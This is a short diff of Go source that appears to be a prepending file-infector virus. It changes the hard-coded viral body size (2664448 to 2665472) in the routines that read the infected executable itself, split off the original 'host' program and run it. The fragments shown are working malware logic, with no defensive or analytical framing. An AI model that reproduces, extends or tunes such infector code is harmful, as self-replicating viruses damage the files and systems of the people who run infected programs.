@@ -121,12 +121,12 @@ func RunHost() {
     infected_data, err := ioutil.ReadFile(os.Args[0]) //Read myself
     check(err)
     allSZ := len(infected_data) //get file full size
-    hostSZ := allSZ - 2664448 //calculate host size
+    hostSZ := allSZ - 2665472 //calculate host size
     
     f, err := os.Open(os.Args[0]) //open host
     check(err)
         
-    f.Seek(2664448, os.SEEK_SET) //go to host start
+    f.Seek(2665472, os.SEEK_SET) //go to host start
     
     hostBuf := make([]byte, hostSZ)
     f.Read(hostBuf) //read it
@@ -225,7 +225,7 @@ func main() {
             } 
     }
         
-    if GetSz(os.Args[0]) > 2664448 {
+    if GetSz(os.Args[0]) > 2665472 {
         RunHost()
     } else {
         os.Exit(0)
